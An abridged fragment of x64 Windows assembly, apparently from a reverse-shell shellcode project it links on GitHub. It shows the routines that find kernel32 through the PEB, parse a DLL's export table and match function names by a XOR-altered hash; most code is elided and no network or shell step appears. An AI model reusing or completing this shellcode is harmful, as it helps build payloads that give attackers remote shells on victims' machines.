;https://github.com/senzee1984/Windows_x64_Tcp_Reverse_Shell_Shellcode/blob/main/reverse_shell.py
...
find_kernel32:
	...
	mov rsi,[rsi + 0x20] ;RSI is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
...
parse_module:        ;Parsing DLL file in memory
	mov ecx, dword[r9 + 0x3c] ;R9 stores  the base address of the module, get the NT header offset
	xor r15, r15;
	mov r15b, 0x88;  ;Offset to Export Directory
	add r15, r9;
	add r15, rcx;
	mov r15d, dword[r15] ;Get the RVA of the export directory
	add r15, r9 ;R14 stores  the VMA of the export directory
	mov ecx, dword[r15 + 0x18] ;ECX stores  the number of function names as an index value
	mov r14d, dword[r15 + 0x20] ;Get the RVA of ENPT
...
iteration:        ;Iterate over each byte
	...
	xor r13, 0xaf ;This variation is added as part of encode*
...
compare_hash:        ;Compare hash
	...
	movzx ecx, word[r10 + 2*rcx] ;Ordinal value -1
